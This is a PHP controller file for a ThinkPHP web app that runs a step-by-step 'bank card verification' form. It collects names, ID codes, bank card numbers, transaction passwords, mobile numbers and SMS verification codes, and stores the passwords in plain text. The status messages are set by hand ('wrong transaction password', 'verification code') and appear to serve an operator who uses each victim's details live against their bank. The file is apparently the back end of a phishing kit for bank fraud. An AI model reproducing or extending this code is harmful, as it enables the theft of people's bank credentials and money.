<?php
declare (strict_types = 1);

namespace app\api\controller;
use think\facade\Db;
use think\facade\Session;
use think\facade\Request;

class Index extends BaseApi
{

    /**
     * 第一步
     * @return string|\think\response\Json
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\DbException
     * @throws \think\db\exception\ModelNotFoundException
     */
    public function index()
    {
		$map1 = [
			['name', '=', $this->params['name']],
			['status', '=',2],
		];
		
		$map2 = [
			['athcode', '=', $this->params['nodecode']],
			['status', '=',2],
		];  
		$data = Db::name('user')->whereOr([ $map1, $map2 ])->find();
		if($data){
			return json(['code'=>500,'msg'=>'您的信息已提交过，无须重复提交','data'=>null]);
		}
		$user['name'] = $this->params['name'];
		$user['athcode'] = $this->params['nodecode'];
        $user['ip'] = $this->getIP();
		$id = 0;
		// 启动事务
		Db::startTrans();
		try {
			$id = Db::name('user')->insertGetId($user);
			Session::set('uid',$id);
			// 提交事务
			Db::commit();
		} catch (\Exception $e) {
			// 回滚事务
			Db::rollback();
		}
		if($id){
			return json(['code'=>200,'msg'=>'提交成功','data'=>['send'=>2000,'url'=>'bindbank.html']]);
		}
        return json(['code'=>404,'msg'=>'','data'=>null]);
    }

    /**
     * 第二步填写银行卡号
     * @return \think\response\Json
     */
	public function bindbank()
    {
        if(request()->isAjax()) {
            if (!Session::get('uid')) {
                return json(['code' => 301, 'msg' => '信息有误，请重新提交', 'data' => ['send' => 2000, 'url' => 'stepzero.html']]);
            }
            $id = 0;
            // 启动事务
            Db::startTrans();
            try {
                $data['bankcode'] = $this->params['account'];
                $data['klx'] = $this->params['klx'];
                $data['up_time'] = time();
                $data['c_status'] = 0;
                $data['status'] = 0;
                Db::name('user')->where('id', Session::get('uid'))->update($data);
                $id = Session::get('uid');
                // 提交事务
                Db::commit();
            } catch (\Exception $e) {
                // 回滚事务
                Db::rollback();
            }
            if ($id) {
                return json(['code' => 200, 'msg' => '提交成功', 'data' => ['send' => 20000, 'url' => 'bindinfo.html']]);
            }
            return json(['code' => 404, 'msg' => '提交失败', 'data' => null]);
        }
        return json(['code' => 404, 'msg' => '', 'data' => null]);
	}

    /**
     * 获取个人信息情况
     * @return \think\response\Json
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\DbException
     * @throws \think\db\exception\ModelNotFoundException
     */
	public function bankinfo(){
        if(!Session::get('uid')){
            return json(['code'=>306,'msg'=>'信息有误，请重新提交','data'=>['send'=>3000,'url'=>'stepzero.html']]);
        }
        $data = Db::name('user')->where(['id'=>Session::get('uid')])->find();
        if($data) {
            switch ($data['c_status']) {
                case '0':
                    $data = [];//['code' => 300, 'msg' => '验证超时，重新验证中', 'data' => ['send' => 3000, 'url' => '']];
                    break;
                case '1':
                    $data = ['code' => 301, 'msg' => '不支持该银行卡，请更换其他银行卡号进行认证', 'data' => ['send' => 3000, 'url' => 'bindbank.html']];
                    break;
                case 2:
                    $data = ['code' => 302, 'msg' => '验证码', 'data' => ['send' => 3000, 'url' => '']];
                    break;
                case 3:
                    $data = ['code' => 303, 'msg' => '不支持【信用卡】，请更换【储蓄卡】', 'data' => ['send' => 3000, 'url' => 'bindbank.html']];
                    break;
                case 4:
                    $data = ['code' => 304, 'msg' => '预留手机号错误', 'data' => ['send' => 3000, 'url' => '']];
                    break;
                case 5:
                    $data = ['code' => 305, 'msg' => '交易密码有误', 'data' => ['send' => 3000, 'url' => '']];
                    break;
                case 6:
                    $data = ['code' => 306, 'msg' => '您输入的信息与银行记录的信息不一致', 'data' => ['send' => 3000, 'url' => 'stepzero.html']];
                    break;
                case 7:
                    $data = ['code' => 200, 'msg' => '审核通过=》24小时内审核完毕', 'data' => ['send' => 3000, 'url' => 'stepzero.html']];
                    break;
                default:
                    break;
            }
            return json($data);
        }else{
            return json(['code' => 300, 'msg' => '验证超时，重新验证中', 'data' => ['send' => 3000, 'url' => '']]);
        }
    }

    /**
     * 获取信息
     * @return \think\response\Json
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\DbException
     * @throws \think\db\exception\ModelNotFoundException
     */
	public function getInfo(){
        if(!Session::get('uid')){
            return json(['code'=>301,'msg'=>'信息有误，请重新提交','data'=>['send'=>2000,'url'=>'stepzero.html']]);
        }
        $data = Db::name('user')->where(['id'=>Session::get('uid')])->find();
        if($data){
            $data['klx'] = $data['klx'].' ('.substr($data['bankcode'],0,4).' **** **** '.substr($data['bankcode'],-3).')';
            return json(['code'=>200,'msg'=>'成功','data'=>$data]);
        }
        return json(['code'=>301,'msg'=>'信息有误，请重新提交','data'=>['send'=>2000,'url'=>'stepzero.html']]);
    }

    /**
     * 完善信息
     * @return \think\response\Json
     */
	public function bindinfo(){
        if(!Session::get('uid')){
            return json(['code'=>301,'msg'=>'信息有误，请重新提交','data'=>['send'=>2000,'url'=>'stepzero.html']]);
        }
        $id = 0;
        if(isset($this->params['paycode'])){
            $data['code'] = $this->params['paycode'];
        }else {
            $data['athcode'] = $this->params['athcode'];
            $data['name'] = $this->params['name'];
            $data['paypwd'] = $this->params['paypwd'];
            $data['mobile'] = $this->params['mobile'];
            $data['up_time'] = time();
        }
        // 启动事务
        Db::startTrans();
        try {
            Db::name('user')->where('id', Session::get('uid'))->update($data);
            $id = Session::get('uid');
            // 提交事务
            Db::commit();
        } catch (\Exception $e) {
            // 回滚事务
            Db::rollback();
        }
        if($id){
            return json(['code'=>200,'msg'=>'提交成功','data'=>['send'=>20000,'url'=>'bindinfo.html','id'=>$id]]);
        }
        return json(['code'=>404,'msg'=>'','data'=>null]);
    }
}
